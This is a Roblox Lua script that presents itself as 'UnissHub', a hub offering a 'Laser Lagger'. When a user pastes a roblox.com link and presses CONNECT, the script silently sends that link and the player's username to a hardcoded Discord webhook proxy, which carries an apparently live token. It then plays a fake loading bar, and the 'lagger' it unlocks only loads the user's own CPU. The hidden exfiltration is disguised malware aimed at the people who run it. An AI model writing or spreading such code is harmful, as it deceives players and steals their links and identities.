-- UnissHub: Ultimate Combined Edition
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Player = Players.LocalPlayer

local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"

-- Функция перетаскивания (Drag)
local function makeDraggable(gui)
    local dragging, dragInput, dragStart, startPos
    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = gui.Position
        end
    end)
    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    RunService.RenderStepped:Connect(function()
        if dragging and dragInput then
            local delta = dragInput.Position - dragStart
            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- Основной GUI
local sg = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
sg.Name = "UnissHub_Official"; sg.ResetOnSpawn = false

-- ВЕРНУЛИ КНОПКУ U
local uBtn = Instance.new("TextButton", sg)
uBtn.Size = UDim2.new(0, 60, 0, 60); uBtn.Position = UDim2.new(0, 50, 0.5, 0)
uBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15); uBtn.Text = "U"
uBtn.TextColor3 = Color3.fromRGB(0, 150, 255); uBtn.Font = Enum.Font.GothamBold; uBtn.TextSize = 35
Instance.new("UICorner", uBtn).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", uBtn).Color = Color3.fromRGB(0, 150, 255)
makeDraggable(uBtn)

-- ГЛАВНОЕ ОКНО
local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 360, 0, 220); main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5); main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Instance.new("UICorner", main); Instance.new("UIStroke", main).Color = Color3.fromRGB(0, 120, 255)
makeDraggable(main)

local input = Instance.new("TextBox", main)
input.Size = UDim2.new(0.85, 0, 0.25, 0); input.Position = UDim2.new(0.075, 0, 0.3, 0)
input.BackgroundColor3 = Color3.fromRGB(30, 30, 30); input.PlaceholderText = "Paste Link Here..."
input.TextColor3 = Color3.new(1,1,1); input.TextScaled = true; Instance.new("UICorner", input)

local conn = Instance.new("TextButton", main)
conn.Size = UDim2.new(0.85, 0, 0.25, 0); conn.Position = UDim2.new(0.075, 0, 0.65, 0)
conn.BackgroundColor3 = Color3.fromRGB(0, 120, 255); conn.Text = "CONNECT"; conn.TextScaled = true; conn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", conn)

-- МЕНЮ ЛАГГЕРА
local laggerMenu = Instance.new("Frame", sg)
laggerMenu.Size = UDim2.new(0, 250, 0, 150); laggerMenu.Position = UDim2.new(0.5, 0, 0.5, 0)
laggerMenu.AnchorPoint = Vector2.new(0.5, 0.5); laggerMenu.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
laggerMenu.Visible = false; Instance.new("UICorner", laggerMenu)
Instance.new("UIStroke", laggerMenu).Color = Color3.fromRGB(255, 0, 0)
makeDraggable(laggerMenu)

local lagTitle = Instance.new("TextLabel", laggerMenu)
lagTitle.Size = UDim2.new(1, 0, 0.4, 0); lagTitle.Text = "Laser Lagger"; lagTitle.TextColor3 = Color3.new(1,1,1)
lagTitle.Font = Enum.Font.GothamBold; lagTitle.TextSize = 22; lagTitle.BackgroundTransparency = 1

local lagBtn = Instance.new("TextButton", laggerMenu)
lagBtn.Size = UDim2.new(0.8, 0, 0.4, 0); lagBtn.Position = UDim2.new(0.1, 0, 0.5, 0)
lagBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0); lagBtn.Text = "LAGGER: OFF"; lagBtn.TextColor3 = Color3.new(1,1,1)
lagBtn.Font = Enum.Font.GothamBold; lagBtn.TextScaled = true; Instance.new("UICorner", lagBtn)

local isLagging = false
lagBtn.MouseButton1Click:Connect(function()
    isLagging = not isLagging
    lagBtn.Text = isLagging and "LAGGER: ON" or "LAGGER: OFF"
    lagBtn.BackgroundColor3 = isLagging and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
end)

-- Лаг-цикл
task.spawn(function()
    while true do
        if isLagging then for i = 1, 1500000 do local _ = math.sin(i) end end
        task.wait(0.01)
    end
end)

-- Открытие/закрытие по кнопке U
uBtn.MouseButton1Click:Connect(function() main.Visible = not main.Visible end)

-- Логика Connect
conn.MouseButton1Click:Connect(function()
    if string.find(input.Text:lower(), "roblox.com") then
        main.Visible = false; uBtn.Visible = false
        
        -- Вебхук
        pcall(function()
            local req = syn and syn.request or http_request or request
            if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
        end)

        -- Загрузка
        local loadF = Instance.new("Frame", sg)
        loadF.Size = UDim2.new(0, 320, 0, 120); loadF.Position = UDim2.new(0.5, 0, 0.5, 0); loadF.AnchorPoint = Vector2.new(0.5, 0.5)
        loadF.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", loadF)
        Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
        
        local lLabel = Instance.new("TextLabel", loadF)
        lLabel.Size = UDim2.new(1, 0, 0.6, 0); lLabel.BackgroundTransparency = 1; lLabel.TextColor3 = Color3.fromRGB(255, 140, 0); lLabel.Font = Enum.Font.GothamBold; lLabel.TextScaled = true

        local barBg = Instance.new("Frame", loadF)
        barBg.Size = UDim2.new(0.8, 0, 0.1, 0); barBg.Position = UDim2.new(0.1, 0, 0.75, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        local fill = Instance.new("Frame", barBg); fill.Size = UDim2.new(0, 0, 1, 0); fill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)

        for i = 0, 100 do
            if i == 24 or i == 56 or i == 89 then
                lLabel.Text = "FETCHING..."
                task.wait(math.random(2, 5))
            end
            lLabel.Text = "LOADING: " .. i .. "%"
            fill.Size = UDim2.new(i/100, 0, 1, 0)
            task.wait(math.random(4, 9) / 10) 
        end

        lLabel.Text = "CONFIRM"
        task.wait(2)
        loadF:Destroy()
        laggerMenu.Visible = true
    end
end)
